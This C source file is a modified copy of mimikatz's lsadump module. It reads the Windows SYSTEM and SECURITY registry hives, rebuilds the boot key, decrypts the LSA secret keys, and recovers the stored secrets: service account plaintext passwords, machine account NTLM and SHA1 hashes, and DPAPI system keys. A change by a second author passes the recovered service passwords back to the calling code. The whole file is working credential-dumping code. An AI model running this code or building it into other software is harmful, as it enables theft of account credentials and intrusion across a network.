/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/

	Modified: b0yd@securifera.com
	          Removed unnecessary code and added parameters to return lsadump data structures
*/
#include "kuhl_m_lsadump.h"

#define STATUS_BUFFER_TOO_SMALL          ((NTSTATUS)0xC0000023L)

const wchar_t * kuhl_m_lsadump_CONTROLSET_SOURCES[] = {L"Current", L"Default"};
BOOL kuhl_m_lsadump_getCurrentControlSet(PKULL_M_REGISTRY_HANDLE hRegistry, HKEY hSystemBase, PHKEY phCurrentControlSet)
{
	BOOL status = FALSE;
	HKEY hSelect;
	DWORD i, szNeeded, controlSet;

	wchar_t currentControlSet[] = L"ControlSet000";

	if(kull_m_registry_RegOpenKeyEx(hRegistry, hSystemBase, L"Select", 0, KEY_READ, &hSelect))
	{
		for(i = 0; !status && (i < ARRAYSIZE(kuhl_m_lsadump_CONTROLSET_SOURCES)); i++)
		{
			szNeeded = sizeof(DWORD); 
			status = kull_m_registry_RegQueryValueEx(hRegistry, hSelect, kuhl_m_lsadump_CONTROLSET_SOURCES[i], NULL, NULL, (LPBYTE) &controlSet, &szNeeded);
		}

		if(status)
		{
			status = FALSE;
			if(swprintf_s(currentControlSet + 10, 4, L"%03u", controlSet) != -1)
				status = kull_m_registry_RegOpenKeyEx(hRegistry, hSystemBase, currentControlSet, 0, KEY_READ, phCurrentControlSet);
		}
		kull_m_registry_RegCloseKey(hRegistry, hSelect);
	}
	return status;
}

const wchar_t * kuhl_m_lsadump_SYSKEY_NAMES[] = {L"JD", L"Skew1", L"GBG", L"Data"};
const BYTE kuhl_m_lsadump_SYSKEY_PERMUT[] = {11, 6, 7, 1, 8, 10, 14, 0, 3, 5, 2, 15, 13, 9, 12, 4};
BOOL kuhl_m_lsadump_getSyskey(PKULL_M_REGISTRY_HANDLE hRegistry, HKEY hLSA, LPBYTE sysKey)
{
	BOOL status = TRUE;
	DWORD i;
	HKEY hKey;
	wchar_t buffer[8 + 1];
	DWORD szBuffer;
	BYTE buffKey[SYSKEY_LENGTH];

	for(i = 0 ; (i < ARRAYSIZE(kuhl_m_lsadump_SYSKEY_NAMES)) && status; i++)
	{
		status = FALSE;
		if(kull_m_registry_RegOpenKeyEx(hRegistry, hLSA, kuhl_m_lsadump_SYSKEY_NAMES[i], 0, KEY_READ, &hKey))
		{
			szBuffer = 8 + 1;
			if(kull_m_registry_RegQueryInfoKey(hRegistry, hKey, buffer, &szBuffer, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL))
				status = swscanf_s(buffer, L"%x", (DWORD *) &buffKey[i*sizeof(DWORD)]) != -1;
			kull_m_registry_RegCloseKey(hRegistry, hKey);
		}
		else PRINT_ERROR(L"LSA Key Class read error\n");
	}
	
	if(status)
		for(i = 0; i < SYSKEY_LENGTH; i++)
			sysKey[i] = buffKey[kuhl_m_lsadump_SYSKEY_PERMUT[i]];	

	return status;
}

BOOL kuhl_m_lsadump_getComputerAndSyskey(IN PKULL_M_REGISTRY_HANDLE hRegistry, IN HKEY hSystemBase, OUT LPBYTE sysKey)
{
	BOOL status = FALSE;
	PVOID computerName;
	HKEY hCurrentControlSet, hComputerNameOrLSA;

	if(kuhl_m_lsadump_getCurrentControlSet(hRegistry, hSystemBase, &hCurrentControlSet))
	{
		kprintf(L"Domain : ");
		if(kull_m_registry_OpenAndQueryWithAlloc(hRegistry, hCurrentControlSet, L"Control\\ComputerName\\ComputerName", L"ComputerName", NULL, &computerName, NULL))
		{
			kprintf(L"%s\n", computerName);
			LocalFree(computerName);
		}

		kprintf(L"SysKey : ");
		if(kull_m_registry_RegOpenKeyEx(hRegistry, hCurrentControlSet, L"Control\\LSA", 0, KEY_READ, &hComputerNameOrLSA))
		{
			if(status = kuhl_m_lsadump_getSyskey(hRegistry, hComputerNameOrLSA, sysKey))
			{
				kull_m_string_wprintf_hex(sysKey, SYSKEY_LENGTH, 0);
				kprintf(L"\n");
			}
			else PRINT_ERROR(L"kuhl_m_lsadump_getSyskey KO\n");
			kull_m_registry_RegCloseKey(hRegistry, hComputerNameOrLSA);
		}
		else PRINT_ERROR(L"kull_m_registry_RegOpenKeyEx LSA KO\n");

		kull_m_registry_RegCloseKey(hRegistry, hCurrentControlSet);
	}
	return status;
}

BOOL kuhl_m_lsadump_getSids(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN HKEY hPolicyBase, IN LPCWSTR littleKey, IN LPCWSTR prefix)
{
	BOOL status = FALSE;
	wchar_t name[] = L"Pol__DmN", sid[] = L"Pol__DmS";
	PVOID buffer;
	LSA_UNICODE_STRING uString = {0, 0, NULL};

	RtlCopyMemory(&name[3], littleKey, 2*sizeof(wchar_t));
	RtlCopyMemory(&sid[3], littleKey, 2*sizeof(wchar_t));
	kprintf(L"%s name : ", prefix);
	if(kull_m_registry_OpenAndQueryWithAlloc(hSecurity, hPolicyBase, name, NULL, NULL, &buffer, NULL))
	{
		uString.Length = ((PUSHORT) buffer)[0];
		uString.MaximumLength = ((PUSHORT) buffer)[1];
		uString.Buffer = (PWSTR) ((PBYTE) buffer + *(PDWORD) ((PBYTE) buffer + 2*sizeof(USHORT)));
		kprintf(L"%wZ", &uString);
		LocalFree(buffer);
	}
	if(kull_m_registry_OpenAndQueryWithAlloc(hSecurity, hPolicyBase, sid, NULL, NULL, &buffer, NULL))
	{
		kprintf(L" ( ");
		kull_m_string_displaySID((PSID) buffer);
		kprintf(L" )");
		LocalFree(buffer);
	}
	kprintf(L"\n");
	return status;
}

BOOL kuhl_m_lsadump_getLsaKeyAndSecrets(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN HKEY hSecurityBase, IN PKULL_M_REGISTRY_HANDLE hSystem, IN HKEY hSystemBase, IN LPBYTE sysKey, IN BOOL secretsOrCache, IN PKUHL_LSADUMP_DCC_CACHE_DATA pCacheData, PSVC_STRUCT *svc_arr, IN size_t svc_arr_size )
{
	BOOL status = FALSE;
	HKEY hPolicy;
	PPOL_REVISION pPolRevision;
	DWORD szNeeded, i, offset;
	LPVOID buffer;
	MD5_CTX md5ctx;
	CRYPTO_BUFFER data = {3 * sizeof(NT5_SYSTEM_KEY), 3 * sizeof(NT5_SYSTEM_KEY), NULL}, key = {MD5_DIGEST_LENGTH, MD5_DIGEST_LENGTH, md5ctx.digest};
	PNT6_SYSTEM_KEYS nt6keysStream = NULL;
	PNT6_SYSTEM_KEY nt6key;
	PNT5_SYSTEM_KEY nt5key = NULL;
	LSA_UNICODE_STRING uString = {0, 0, NULL};

	if(kull_m_registry_RegOpenKeyEx(hSecurity, hSecurityBase, L"Policy", 0, KEY_READ, &hPolicy))
	{
		kprintf(L"\n");
		kuhl_m_lsadump_getSids(hSecurity, hPolicy, L"Ac", L"Local");
		kuhl_m_lsadump_getSids(hSecurity, hPolicy, L"Pr", L"Domain");

		if(kull_m_registry_OpenAndQueryWithAlloc(hSecurity, hPolicy, L"PolDnDDN", NULL, NULL, &buffer, NULL))
		{
			uString.Length = ((PUSHORT) buffer)[0];
			uString.MaximumLength = ((PUSHORT) buffer)[1];
			uString.Buffer = (PWSTR) ((PBYTE) buffer + *(PDWORD) ((PBYTE) buffer + 2*sizeof(USHORT)));
			kprintf(L"Domain FQDN : %wZ\n", &uString);
			LocalFree(buffer);
		}

		if(kull_m_registry_OpenAndQueryWithAlloc(hSecurity, hPolicy, L"PolRevision", NULL, NULL, (LPVOID *) &pPolRevision, NULL))
		{
			kprintf(L"\nPolicy subsystem is : %hu.%hu\n", pPolRevision->Major, pPolRevision->Minor);
			if(kull_m_registry_OpenAndQueryWithAlloc(hSecurity, hPolicy, (pPolRevision->Minor > 9) ? L"PolEKList" : L"PolSecretEncryptionKey", NULL, NULL, &buffer, &szNeeded))
			{
				if(pPolRevision->Minor > 9) // NT 6
				{
					if(kuhl_m_lsadump_sec_aes256((PNT6_HARD_SECRET) buffer, szNeeded, NULL, sysKey))
					{
						if(nt6keysStream = (PNT6_SYSTEM_KEYS) LocalAlloc(LPTR, ((PNT6_HARD_SECRET) buffer)->clearSecret.SecretSize))
						{
							RtlCopyMemory(nt6keysStream, ((PNT6_HARD_SECRET) buffer)->clearSecret.Secret, ((PNT6_HARD_SECRET) buffer)->clearSecret.SecretSize);
							kprintf(L"LSA Key(s) : %u, default ", nt6keysStream->nbKeys); kull_m_string_displayGUID(&nt6keysStream->CurrentKeyID); kprintf(L"\n");
							for(i = 0, offset = 0; i < nt6keysStream->nbKeys; i++, offset += FIELD_OFFSET(NT6_SYSTEM_KEY, Key) + nt6key->KeySize)
							{
								nt6key = (PNT6_SYSTEM_KEY) ((PBYTE) nt6keysStream->Keys + offset);
								kprintf(L"  [%02u] ", i); kull_m_string_displayGUID(&nt6key->KeyId); kprintf(L" "); kull_m_string_wprintf_hex(nt6key->Key, nt6key->KeySize, 0); kprintf(L"\n");
							}
						}
					}
				}
				else // NT 5
				{
					MD5Init(&md5ctx);
					MD5Update(&md5ctx, sysKey, SYSKEY_LENGTH);
					for(i = 0; i < 1000; i++)
						MD5Update(&md5ctx, ((PNT5_SYSTEM_KEYS) buffer)->lazyiv, LAZY_IV_SIZE);
					MD5Final(&md5ctx);
					data.Buffer = (PBYTE) ((PNT5_SYSTEM_KEYS) buffer)->keys;
					if(NT_SUCCESS(RtlEncryptDecryptRC4(&data, &key)))
					{
						if(nt5key = (PNT5_SYSTEM_KEY) LocalAlloc(LPTR, sizeof(NT5_SYSTEM_KEY)))
						{
							RtlCopyMemory(nt5key->key, ((PNT5_SYSTEM_KEYS) buffer)->keys[1].key, sizeof(NT5_SYSTEM_KEY));
							kprintf(L"LSA Key : "); 
							kull_m_string_wprintf_hex(nt5key->key, sizeof(NT5_SYSTEM_KEY), 0);
							kprintf(L"\n");
						}
					}
				}
				LocalFree(buffer);
			}
			LocalFree(pPolRevision);
		}

		if(nt6keysStream || nt5key)
		{
			if(secretsOrCache)
				kuhl_m_lsadump_getSecrets(hSecurity, hPolicy, hSystem, hSystemBase, nt6keysStream, nt5key, svc_arr, svc_arr_size);
			//else
			//	kuhl_m_lsadump_getNLKMSecretAndCache(hSecurity, hPolicy, hSecurityBase, nt6keysStream, nt5key, pCacheData);
		}
		kull_m_registry_RegCloseKey(hSecurity, hPolicy);
	}

	if(nt6keysStream)
		LocalFree(nt6keysStream);
	if(nt5key)
		LocalFree(nt5key);

	return status;
}

BOOL kuhl_m_lsadump_getSecrets(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN HKEY hPolicyBase, IN PKULL_M_REGISTRY_HANDLE hSystem, IN HKEY hSystemBase, PNT6_SYSTEM_KEYS lsaKeysStream, PNT5_SYSTEM_KEY lsaKeyUnique, PSVC_STRUCT *svc_arr, IN size_t svc_arr_size )
{
	BOOL status = FALSE;
	HKEY hSecrets, hSecret, hCurrentControlSet, hServiceBase;
	DWORD i, j, nbSubKeys, szMaxSubKeyLen, szSecretName, szSecret;
	PVOID pSecret;
	wchar_t * secretName;

	if(kull_m_registry_RegOpenKeyEx(hSecurity, hPolicyBase, L"Secrets", 0, KEY_READ, &hSecrets))
	{
		if(kuhl_m_lsadump_getCurrentControlSet(hSystem, hSystemBase, &hCurrentControlSet))
		{
			if(kull_m_registry_RegOpenKeyEx(hSystem, hCurrentControlSet, L"services", 0, KEY_READ, &hServiceBase))
			{
				if(kull_m_registry_RegQueryInfoKey(hSecurity, hSecrets, NULL, NULL, NULL, &nbSubKeys, &szMaxSubKeyLen, NULL, NULL, NULL, NULL, NULL, NULL))
				{
					szMaxSubKeyLen++;
					if(secretName = (wchar_t *) LocalAlloc(LPTR, (szMaxSubKeyLen + 1) * sizeof(wchar_t)))
					{
						for(i = 0; i < nbSubKeys; i++)
						{
							szSecretName = szMaxSubKeyLen;
							if(kull_m_registry_RegEnumKeyEx(hSecurity, hSecrets, i, secretName, &szSecretName, NULL, NULL, NULL, NULL))
							{
								PSVC_STRUCT cur_svc = NULL;
								kprintf(L"\nSecret  : %s", secretName);
								if(_wcsnicmp(secretName, L"_SC_", 4) == 0){
									kuhl_m_lsadump_getInfosFromServiceName(hSystem, hServiceBase, secretName + 4);
									//Nothing to do
									if( svc_arr != NULL ){
										for( j =0; j < svc_arr_size; j++){
											if( _wcsnicmp(svc_arr[j]->service_name, secretName + 4, wcslen(secretName + 4)) == 0) {
												cur_svc = svc_arr[j];
												break;
											}
										}
									}
								}

								//Goto the next one
								if( cur_svc == NULL)
									continue;

								if(kull_m_registry_RegOpenKeyEx(hSecurity, hSecrets, secretName, 0, KEY_READ, &hSecret))
								{
									if(kuhl_m_lsadump_decryptSecret(hSecurity, hSecret, L"CurrVal", lsaKeysStream, lsaKeyUnique, &pSecret, &szSecret))
									{
										kuhl_m_lsadump_candidateSecret(szSecret, pSecret, L"\ncur/", secretName, cur_svc);
										LocalFree(pSecret);
									}
									if(kuhl_m_lsadump_decryptSecret(hSecurity, hSecret, L"OldVal", lsaKeysStream, lsaKeyUnique, &pSecret, &szSecret))
									{
										kuhl_m_lsadump_candidateSecret(szSecret, pSecret, L"\nold/", secretName, NULL);
										LocalFree(pSecret);
									}
									kull_m_registry_RegCloseKey(hSecurity, hSecret);
								}
								kprintf(L"\n");
							}
						}
						LocalFree(secretName);
					}
				}
				kull_m_registry_RegCloseKey(hSystem, hServiceBase);
			}
			kull_m_registry_RegCloseKey(hSystem, hCurrentControlSet);
		}
		kull_m_registry_RegCloseKey(hSecurity, hSecrets);
	}
	return status;
}

DECLARE_CONST_UNICODE_STRING(NTLM_PACKAGE_NAME, L"NTLM");

void kuhl_m_lsadump_getInfosFromServiceName(IN PKULL_M_REGISTRY_HANDLE hSystem, IN HKEY hSystemBase, IN PCWSTR serviceName)
{
	DWORD szNeeded;
	LPVOID objectName;
	if(kull_m_registry_OpenAndQueryWithAlloc(hSystem, hSystemBase, serviceName, L"ObjectName", NULL, &objectName, &szNeeded))
	{
		kprintf(L" / service \'%s\' with username : %.*s", serviceName, szNeeded / sizeof(wchar_t), objectName);
		LocalFree(objectName);
	}
}

BOOL kuhl_m_lsadump_decryptSecret(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN HKEY hSecret, IN LPCWSTR KeyName, IN PNT6_SYSTEM_KEYS lsaKeysStream, IN PNT5_SYSTEM_KEY lsaKeyUnique, IN PVOID * pBufferOut, IN PDWORD pSzBufferOut)
{
	BOOL status = FALSE;
	DWORD szSecret = 0;
	PVOID secret;
	CRYPTO_BUFFER data, output = {0, 0, NULL}, key = {sizeof(NT5_SYSTEM_KEY), sizeof(NT5_SYSTEM_KEY), NULL};

	if(kull_m_registry_OpenAndQueryWithAlloc(hSecurity, hSecret, KeyName, NULL, NULL, &secret, &szSecret))
	{
		if(lsaKeysStream)
		{
			if(kuhl_m_lsadump_sec_aes256((PNT6_HARD_SECRET) secret, szSecret, lsaKeysStream, NULL))
			{
				*pSzBufferOut = ((PNT6_HARD_SECRET) secret)->clearSecret.SecretSize;
				if(*pBufferOut = LocalAlloc(LPTR, *pSzBufferOut))
				{
					status = TRUE;
					RtlCopyMemory(*pBufferOut, ((PNT6_HARD_SECRET) secret)->clearSecret.Secret, *pSzBufferOut);
				}
			}
		}
		else if(lsaKeyUnique)
		{
			key.Buffer = lsaKeyUnique->key;
			data.Length = data.MaximumLength = ((PNT5_HARD_SECRET) secret)->encryptedStructSize;
			data.Buffer = (PBYTE) secret + szSecret - data.Length; // dirty hack to not extract x64/x86 from REG ; // ((PNT5_HARD_SECRET) secret)->encryptedSecret;
			if(RtlDecryptDESblocksECB(&data, &key, &output) == STATUS_BUFFER_TOO_SMALL)
			{
				if(output.Buffer = (PBYTE) LocalAlloc(LPTR, output.Length))
				{
					output.MaximumLength = output.Length;
					if(NT_SUCCESS(RtlDecryptDESblocksECB(&data, &key, &output)))
					{
						*pSzBufferOut = output.Length;
						if(*pBufferOut = LocalAlloc(LPTR, *pSzBufferOut))
						{
							status = TRUE;
							RtlCopyMemory(*pBufferOut, output.Buffer, *pSzBufferOut);
						}
					}
					LocalFree(output.Buffer);
				}
			}
		}
		LocalFree(secret);
	}
	return status;
}

void kuhl_m_lsadump_candidateSecret(DWORD szBytesSecrets, PVOID bufferSecret, PCWSTR prefix, PCWSTR secretName, PSVC_STRUCT svc_struct )
{
	UNICODE_STRING candidateString = {(USHORT) szBytesSecrets, (USHORT) szBytesSecrets, (PWSTR) bufferSecret};
	BOOL isStringOk = FALSE;
	PVOID bufferHash[SHA_DIGEST_LENGTH]; // ok for NTLM too
	if(bufferSecret && szBytesSecrets)
	{
		kprintf(L"%s", prefix);
		if(szBytesSecrets <= USHRT_MAX)
			if(isStringOk = kull_m_string_suspectUnicodeString(&candidateString)){
				kprintf(L"text: %wZ", &candidateString);
				if( candidateString.Length > 0 && svc_struct != NULL ){
					//Allocate memory for service name
					unsigned int svc_pwd_buf_size =  candidateString.Length + 2;
					wchar_t *svc_pwd_str = (wchar_t *)calloc(1, svc_pwd_buf_size );
					if( svc_pwd_str != NULL ){
						memcpy(svc_pwd_str, candidateString.Buffer, svc_pwd_buf_size - 2);
						svc_struct->service_password = svc_pwd_str;
					}
				}
			}

		if(!isStringOk)
		{
			kprintf(L"hex : ");
			kull_m_string_wprintf_hex(bufferSecret, szBytesSecrets, 1);
		}

		if(_wcsicmp(secretName, L"$MACHINE.ACC") == 0)
		{
			if(kull_m_crypto_hash(CALG_MD4, bufferSecret, szBytesSecrets, bufferHash, MD4_DIGEST_LENGTH))
			{
				kprintf(L"\n    NTLM:");
				kull_m_string_wprintf_hex(bufferHash, MD4_DIGEST_LENGTH, 0);
			}
			if(kull_m_crypto_hash(CALG_SHA1, bufferSecret, szBytesSecrets, bufferHash, SHA_DIGEST_LENGTH))
			{
				kprintf(L"\n    SHA1:");
				kull_m_string_wprintf_hex(bufferHash, SHA_DIGEST_LENGTH, 0);
			}
		}
		else if((_wcsicmp(secretName, L"DPAPI_SYSTEM") == 0) && (szBytesSecrets == sizeof(DWORD) + 2 * SHA_DIGEST_LENGTH))
		{
			kprintf(L"\n    full: ");
			kull_m_string_wprintf_hex((PBYTE) bufferSecret + sizeof(DWORD), 2 * SHA_DIGEST_LENGTH, 0);
			kprintf(L"\n    m/u : ");
			kull_m_string_wprintf_hex((PBYTE) bufferSecret + sizeof(DWORD), SHA_DIGEST_LENGTH, 0);
			kprintf(L" / ");
			kull_m_string_wprintf_hex((PBYTE) bufferSecret + sizeof(DWORD) + SHA_DIGEST_LENGTH, SHA_DIGEST_LENGTH, 0);
		}
	}
}

BOOL kuhl_m_lsadump_sec_aes256(PNT6_HARD_SECRET hardSecretBlob, DWORD hardSecretBlobSize, PNT6_SYSTEM_KEYS lsaKeysStream, PBYTE sysKey)
{
	BOOL status = FALSE;
	BYTE keyBuffer[AES_256_KEY_SIZE];
	DWORD i, offset, szNeeded;
	HCRYPTPROV hContext;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;
	PBYTE pKey = NULL;
	PNT6_SYSTEM_KEY lsaKey;

	if(lsaKeysStream)
	{
		for(i = 0, offset = 0; i < lsaKeysStream->nbKeys; i++, offset += FIELD_OFFSET(NT6_SYSTEM_KEY, Key) + lsaKey->KeySize)
		{
			lsaKey = (PNT6_SYSTEM_KEY) ((PBYTE) lsaKeysStream->Keys + offset);
			if(RtlEqualGuid(&hardSecretBlob->KeyId, &lsaKey->KeyId))
			{
				pKey = lsaKey->Key;
				szNeeded = lsaKey->KeySize;
				break;
			}
		}
	}
	else if(sysKey)
	{
		pKey = sysKey;
		szNeeded = SYSKEY_LENGTH;
	}

	if(pKey)
	{
		if(CryptAcquireContext(&hContext, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
		{
			if(CryptCreateHash(hContext, CALG_SHA_256, 0, 0, &hHash))
			{
				CryptHashData(hHash, pKey, szNeeded, 0);
				for(i = 0; i < 1000; i++)
					CryptHashData(hHash, hardSecretBlob->lazyiv, LAZY_NT6_IV_SIZE, 0);
				
				szNeeded = sizeof(keyBuffer);
				if(CryptGetHashParam(hHash, HP_HASHVAL, keyBuffer, &szNeeded, 0))
				{
					if(kull_m_crypto_hkey(hContext, CALG_AES_256, keyBuffer, sizeof(keyBuffer), 0, &hKey, NULL))
					{
						i = CRYPT_MODE_ECB;
						if(CryptSetKeyParam(hKey, KP_MODE, (LPCBYTE) &i, 0))
						{
							szNeeded = hardSecretBlobSize - FIELD_OFFSET(NT6_HARD_SECRET, encryptedSecret);
							status = CryptDecrypt(hKey, 0, FALSE, 0, hardSecretBlob->encryptedSecret, &szNeeded);
							if(!status)
								PRINT_ERROR_AUTO(L"CryptDecrypt");
						}
						else PRINT_ERROR_AUTO(L"CryptSetKeyParam");
						CryptDestroyKey(hKey);
					}
					else PRINT_ERROR_AUTO(L"kull_m_crypto_hkey");
				}
				CryptDestroyHash(hHash);
			}
			CryptReleaseContext(hContext, 0);
		}
	}
	return status;
}

NTSTATUS kuhl_m_lsadump_secrets( HKEY passedKey, PSVC_STRUCT *svc_arr, size_t svc_arr_size )
{
	PKULL_M_REGISTRY_HANDLE hLocalMachine;
	BYTE sysKey[SYSKEY_LENGTH];
	KUHL_LSADUMP_DCC_CACHE_DATA cacheData = {0};
	HKEY hSystemBase,hSecurityBase;

	if(kull_m_registry_open(KULL_M_REGISTRY_TYPE_OWN, NULL, FALSE, &hLocalMachine))
	{
		if(kull_m_registry_RegOpenKeyEx(hLocalMachine, passedKey, L"SYSTEM", 0, KEY_READ, &hSystemBase))
		{
			if(kuhl_m_lsadump_getComputerAndSyskey(hLocalMachine, hSystemBase, sysKey))
			{
				if(kull_m_registry_RegOpenKeyEx(hLocalMachine, passedKey, L"SECURITY", 0, KEY_READ, &hSecurityBase))
				{
					kuhl_m_lsadump_getLsaKeyAndSecrets(hLocalMachine, hSecurityBase, hLocalMachine, hSystemBase, sysKey, TRUE, &cacheData, svc_arr, svc_arr_size);
					kull_m_registry_RegCloseKey(hLocalMachine, hSecurityBase);
				}
			}

			kull_m_registry_RegCloseKey(hLocalMachine, hSystemBase);
		}
		kull_m_registry_close(hLocalMachine);
	}

	return 0;
}